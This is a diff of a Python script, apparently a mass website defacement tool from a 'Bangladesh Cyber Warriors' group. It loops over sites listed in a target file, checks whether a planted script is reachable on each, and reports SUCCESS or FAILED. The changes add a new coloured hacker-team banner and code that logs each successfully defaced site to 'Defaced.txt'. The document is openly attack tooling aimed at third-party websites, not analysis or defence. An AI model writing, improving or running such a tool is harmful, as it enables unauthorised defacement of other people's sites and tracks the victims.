@@ -1,5 +1,3 @@
-#-*- coding: utf-8 -*-
-
 try:
    import requests
    import os.path
@@ -7,14 +5,20 @@ try:
 except ImportError:
    exit("install requests and try again ...")
 
-banner = """____    ____  __        __ 
-|  _ \  /  __\ \ \      / / 
-| |_)/  | /     \ \ /\ / / 
-| |_)\  | \__    \ V  V / 
-|____/  \____\    \_/\_/ 
-~[Bamgladesh Cyber Warriors]~
-~{Coded By Athro Haque}~
-Thanks To all the member of BCW and Black_Phish"""
+banner = """
+\033[1;92m_____         ___  ___ ______  _____ _    _
+\033[1;91m|_   _|        |  \/  | | ___ \/  __ \ |  | |
+\033[1;92m  | | ___  __ _| .  . | | |_/ /| /  \/ |  | |
+\033[1;91m  | |/ _ \/ _` | |\/| | | ___ \| |   | |/\| |
+\033[1;92m  | |  __/ (_| | |  | | | |_/ /| \__/\  /\  /
+\033[1;91m  \_/\___|\__,_\_|  |_/ \____/  \____/\/  \/
+\033[1;92m                    ______                  
+\033[1;91m                   |______|
++++++++++++++++++++++++
++[Coded By Athro Haque]
++++++++++++++++++++++++
+
+ """
 
 b = '\033[31m'
 h = '\033[32m'
@@ -45,6 +49,8 @@ def aox(script,target_file="target.txt"):
                print(m+"["+b+" FAILED!"+m+" ] %s/%s"%(site,script))
             else:
                print(m+"["+h+" SUCCESS"+m+" ] %s/%s"%(site,script))
+               bisa = "%s/%s"%(site,script)
+               open('Defaced.txt', 'a').write(bisa+"\n")
 
          except requests.exceptions.RequestException:
             continue
